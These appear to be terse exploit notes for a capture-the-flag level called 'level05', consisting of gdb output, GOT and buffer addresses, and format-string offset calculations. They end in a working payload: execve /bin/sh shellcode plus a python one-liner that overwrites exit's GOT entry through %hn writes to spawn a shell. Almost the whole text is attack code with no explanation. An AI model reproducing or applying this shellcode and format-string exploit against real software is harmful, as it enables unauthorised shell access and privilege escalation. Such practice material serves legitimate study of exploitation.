

exit(GOT) 	=> 0x80497e0

buffer => 0xffffd6a8 + 8 
buffershellcode => 0xffffd6b0



system 1 => ffff =>  65535 - 54960 => 10575
system 2 => d6b0 =>  54960 - 8 - 23 => 54929

disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
(gdb) x/x *0x80497e0
0x8048376 <exit@plt+6>: 0x00001868
(gdb) x/x 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376


shellcode 23 =>  \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '%54929c' + '%10\$hn' + '%10575c' + '%11\$hn'") | ./level05